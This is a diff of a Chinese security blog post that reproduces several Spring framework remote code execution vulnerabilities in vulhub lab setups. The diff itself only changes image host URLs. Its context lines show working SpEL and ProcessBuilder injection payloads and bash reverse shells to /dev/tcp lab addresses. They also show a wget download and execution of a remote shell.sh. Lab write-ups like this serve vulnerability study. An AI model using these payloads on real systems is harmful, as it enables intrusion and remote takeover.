@@ -47,19 +47,19 @@ SpEL原理如下∶
 
 1.看web应用程序的ico小图标，是一个小绿叶子
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903082953.png)image-20210830095238341
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903082953.png)image-20210830095238341
 
 2.看报错页面，如果默认报错页面没有修复，那就是长这样
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903082954.png)image-20210830095328827
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903082954.png)image-20210830095328827
 
 3.wappalyzer插件识别
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903082955.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903082955.png)
 
 4.f12看X-Application-Context头
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903082956.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903082956.png)
 
 ## 本地环境搭建
 
@@ -69,47 +69,47 @@ SpEL原理如下∶
 
 这里选择得商业版，免费试用30天
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903082959.png)1111![](https://gitee.com/fuli009/images/raw/master/public/20210903083000.png)image-20210829150233085
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903082959.png)1111![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083000.png)image-20210829150233085
 
 安装目录默认
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083002.png)image-20210829150403552
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083002.png)image-20210829150403552
 
 报错不用管，点击确认，一直默认下一步
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083003.png)image-20210829150438103
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083003.png)image-20210829150438103
 
 双击下图图标
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083004.png)image-20210829150723616![](https://gitee.com/fuli009/images/raw/master/public/20210903083005.png)image-20210829150816862![](https://gitee.com/fuli009/images/raw/master/public/20210903083006.png)image-20210829150911247![](https://gitee.com/fuli009/images/raw/master/public/20210903083007.png)image-20210829150927153![](https://gitee.com/fuli009/images/raw/master/public/20210903083008.png)image-20210829152308559![](https://gitee.com/fuli009/images/raw/master/public/20210903083010.png)image-20210829152347602![](https://gitee.com/fuli009/images/raw/master/public/20210903083011.png)image-20210829152445317
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083004.png)image-20210829150723616![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083005.png)image-20210829150816862![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083006.png)image-20210829150911247![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083007.png)image-20210829150927153![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083008.png)image-20210829152308559![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083010.png)image-20210829152347602![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083011.png)image-20210829152445317
 
 选择Download SDK
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083012.png)image-20210829152515464
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083012.png)image-20210829152515464
 
 选择jdk1.8
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083015.png)image-20210829160411559![]()image-20210829160428309![](https://gitee.com/fuli009/images/raw/master/public/20210903083016.png)image-20210829153041039
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083015.png)image-20210829160411559![]()image-20210829160428309![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083016.png)image-20210829153041039
 
 点next
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083017.png)image-20210829160213693
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083017.png)image-20210829160213693
 
 点击Spring Web
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083018.png)image-20210829160555701
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083018.png)image-20210829160555701
 
 等待安装
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083020.png)image-20210829161052043
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083020.png)image-20210829161052043
 
 点击右上角启动，可以看见默认端口8080
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083021.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083021.png)
 
 成功访问，部署成功
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083023.png)image-20210829162247520
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083023.png)image-20210829162247520
 
 这里复现的环境搭建均采用p牛的vulhub靶场环境。
 
@@ -135,11 +135,11 @@ SpEL来执行，攻击者可以在被授权的情况下通过构造response_type
 
 启动漏洞
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083024.png)image-20210829172348141
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083024.png)image-20210829172348141
 
 访问url
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083025.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083025.png)
 
 输入下面的漏洞测试url：
 
@@ -150,7 +150,7 @@ SpEL来执行，攻击者可以在被授权的情况下通过构造response_type
 
 访问后会弹窗，输入用户名和密码 admin:admin即可，返回结果可以看到值被成功计算为2*2=4
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083026.png)![](https://gitee.com/fuli009/images/raw/master/public/20210903083027.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083026.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083027.png)
 
 页面返回执行了我们输入的SpEL表达式，这里可以看作是SpEL表达式的注入，既然表达式被执行了，我们可以考虑代码注入的可能性。
 
@@ -169,7 +169,7 @@ SpEL来执行，攻击者可以在被授权的情况下通过构造response_type
     print(poc)  
     
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083029.png)image-20210829191932279
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083029.png)image-20210829191932279
 
 可以看出该poc对输入的命令进行了变形，将命令的每个字符串转化为ASCII码配合tostring()方法并且用concat拼接传入exec执行。
 
@@ -186,7 +186,7 @@ SpEL来执行，攻击者可以在被授权的情况下通过构造response_type
     bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3My4xMzMvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}  
     
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083030.png)image-20210829191700097
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083030.png)image-20210829191700097
 
 生成poc
 
@@ -196,7 +196,7 @@ SpEL来执行，攻击者可以在被授权的情况下通过构造response_type
       
     
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083031.png)image-20210829191855899
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083031.png)image-20210829191855899
 
 修改后的url：
 
@@ -211,11 +211,11 @@ SpEL来执行，攻击者可以在被授权的情况下通过构造response_type
 
 监听端口：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083033.png)image-20210829192032257
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083033.png)image-20210829192032257
 
 执行url，看见如图的显示页面说明已成功执行：
 
-![]()![](https://gitee.com/fuli009/images/raw/master/public/20210903083034.png)image-20210829195130626
+![]()![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083034.png)image-20210829195130626
 
 反弹shell成功。
 
@@ -252,15 +252,15 @@ Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（�
 
 开启漏洞
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083035.png)image-20210829203741029![](https://gitee.com/fuli009/images/raw/master/public/20210903083037.png)image-20210829203746016
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083035.png)image-20210829203741029![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083037.png)image-20210829203746016
 
 点击login
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083038.png)image-20210829203825199
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083038.png)image-20210829203825199
 
 可以看见这里有很多默认的用户名密码，随便选一组登录系统
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083040.png)image-20210829203850907
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083040.png)image-20210829203850907
 
 然后访问id为1的酒店地址：
 
@@ -269,19 +269,19 @@ Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（�
     http://192.168.173.144:8080/hotels/1  
     
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083041.png)image-20210829204104888
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083041.png)image-20210829204104888
 
 点击预订按钮”Book Hotel"，填写相关信息后点击“ Process”(从这一步，其实WebFlow就正式开始了)︰
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083042.png)image-20210829204232794
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083042.png)image-20210829204232794
 
 随便输入一些内容后，我们点击Proceed然后会跳转到Confirm页面（Credit Card为16位）：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083043.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083043.png)
 
 点击confirm时进行抓包
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083044.png)image-20210829204401161![](https://gitee.com/fuli009/images/raw/master/public/20210903083045.png)image-20210829204731522
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083044.png)image-20210829204401161![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083045.png)image-20210829204731522
 
 反弹shell的poc：
 
@@ -294,7 +294,7 @@ Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（�
     &_(new java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/192.168.173.133/1234 0>%261")).start()=vulhub  
     
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083046.png)image-20210829210014751
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083046.png)image-20210829210014751
 
 exp扩展
 
@@ -305,7 +305,7 @@ exp扩展
 >     >
 >
 >
-> ![](https://gitee.com/fuli009/images/raw/master/public/20210903083047.png)image-20210829211034218![](https://gitee.com/fuli009/images/raw/master/public/20210903083048.png)image-20210829211128104
+> ![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083047.png)image-20210829211034218![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083048.png)image-20210829211128104
 
 > 2、使用wget下载远程bash脚本
 >  
@@ -348,7 +348,7 @@ rest服务器，通过构造好的JSON数据来执行任意Java代码。
 
 开启漏洞环境：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083049.png)image-20210829212225888![](https://gitee.com/fuli009/images/raw/master/public/20210903083050.png)image-20210829212307609
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083049.png)image-20210829212225888![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083050.png)image-20210829212307609
 
 看到 json格式的返回值，说明这是一个 Restful风格的API服务器。
 
@@ -359,13 +359,13 @@ rest服务器，通过构造好的JSON数据来执行任意Java代码。
     http://192.168.173.144:8080/customers/1  
     
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083051.png)image-20210829212445500
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083051.png)image-20210829212445500
 
 #### 漏洞复现
 
 bp抓包，并且使用PATCH请求来修改：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083052.png)image-20210829213412995
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083052.png)image-20210829213412995
 
 创建文件touch /tmp/zcc的poc，需要对其进行十进制编码：
 
@@ -376,7 +376,7 @@ bp抓包，并且使用PATCH请求来修改：
     '116,111,117,99,104,32,47,116,109,112,47,122,99,99'  
     
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083054.png)image-20210829213806596
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083054.png)image-20210829213806596
 
 将该编码写入poc，放入请求包，注意json格式的poc上面留一个空行，Content-Type: 为application/json-patch+json
 
@@ -400,11 +400,11 @@ bp抓包，并且使用PATCH请求来修改：
     ]  
     
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083055.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083055.png)
 
 成功写入：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083056.png)image-20210829214306623
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083056.png)image-20210829214306623
 
 反弹shell的poc，先进行base64编码：
 
@@ -418,7 +418,7 @@ bp抓包，并且使用PATCH请求来修改：
     98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,51,77,121,52,120,77,122,77,118,77,84,73,122,78,67,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125  
     
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083057.png)image-20210829214750387![](https://gitee.com/fuli009/images/raw/master/public/20210903083058.png)image-20210829214929261
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083057.png)image-20210829214750387![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083058.png)image-20210829214929261
 
 写入poc，成功反弹。
 
@@ -450,7 +450,7 @@ messaging中，其允许客户端订阅消息，并使用selector过滤消息。
 
 开启漏洞
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083059.png)image-20210829215634535![](https://gitee.com/fuli009/images/raw/master/public/20210903083100.png)image-20210829215721412
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083059.png)image-20210829215634535![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083100.png)image-20210829215721412
 
 访问该页面：
 
@@ -459,7 +459,7 @@ messaging中，其允许客户端订阅消息，并使用selector过滤消息。
     http://192.168.173.144:8080/gs-guide-websocket  
     
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083101.png)image-20210829220006857
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083101.png)image-20210829220006857
 
 #### 漏洞复现
 
@@ -552,7 +552,7 @@ messaging中，其允许客户端订阅消息，并使用selector过滤消息。
     }, data)  
     
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083102.png)image-20210829220649484![](https://gitee.com/fuli009/images/raw/master/public/20210903083103.png)image-20210829220854352
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083102.png)image-20210829220649484![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083103.png)image-20210829220854352
 
 成功反弹。
 
@@ -587,7 +587,7 @@ Data下所有子项目共享的基础框架。Spring Data Commons
 
 启动漏洞
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083104.png)image-20210829221718475![](https://gitee.com/fuli009/images/raw/master/public/20210903083106.png)image-20210829221818001
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083104.png)image-20210829221718475![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083106.png)image-20210829221818001
 
 #### 漏洞复现
 
@@ -598,7 +598,7 @@ Data下所有子项目共享的基础框架。Spring Data Commons
     http://192.168.173.144:8080/users  
     
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083108.png)image-20210829221903184![](https://gitee.com/fuli009/images/raw/master/public/20210903083109.png)image-20210829222003810
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083108.png)image-20210829221903184![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083109.png)image-20210829222003810
 
 加上poc的请求包如下：
 
@@ -622,7 +622,7 @@ Data下所有子项目共享的基础框架。Spring Data Commons
     username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/zcc")]=&password=&repeatedPassword=  
     
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083110.png)image-20210829222834353![](https://gitee.com/fuli009/images/raw/master/public/20210903083111.png)image-20210829222911752
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083110.png)image-20210829222834353![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083111.png)image-20210829222911752
 
 成功写入。
 
@@ -630,7 +630,7 @@ Data下所有子项目共享的基础框架。Spring Data Commons
 
 写一个shell.sh文件，开启http服务：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083112.png)image-20210829223228384![](https://gitee.com/fuli009/images/raw/master/public/20210903083113.png)image-20210829223331882
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083112.png)image-20210829223228384![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083113.png)image-20210829223331882
 
 下载执行sh脚本：
 
@@ -639,7 +639,7 @@ Data下所有子项目共享的基础框架。Spring Data Commons
     /usr/bin/wget -qO /tmp/shell.sh http://192.168.173.131/shell.sh  
     
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083114.png)image-20210829223703018![](https://gitee.com/fuli009/images/raw/master/public/20210903083115.png)image-20210829223713495![](https://gitee.com/fuli009/images/raw/master/public/20210903083116.png)image-20210829223749707
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083114.png)image-20210829223703018![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083115.png)image-20210829223713495![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083116.png)image-20210829223749707
 
 执行shell.sh
 
@@ -648,7 +648,7 @@ Data下所有子项目共享的基础框架。Spring Data Commons
     /bin/bash /tmp/shell.sh  
     
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083117.png)image-20210829223919181
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083117.png)image-20210829223919181
 
 成功反弹。
 
@@ -713,14 +713,14 @@ BeanShell远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM
 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)
 
  _
-**走过路过的大佬们留个关注再走呗**_![](https://gitee.com/fuli009/images/raw/master/public/20210903083118.png)
+**走过路过的大佬们留个关注再走呗**_![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083118.png)
 
  **往期文章有彩蛋哦**
-**![](https://gitee.com/fuli009/images/raw/master/public/20210903083119.png)**  
+**![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083119.png)**  
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210903083120.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083120.png)
 
-一如既往的学习，一如既往的整理，一如即往的分享。![](https://gitee.com/fuli009/images/raw/master/public/20210903083121.png)  
+一如既往的学习，一如既往的整理，一如即往的分享。![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210903083121.png)  
 
 “ **如侵权请私聊公众号删文** ”
 
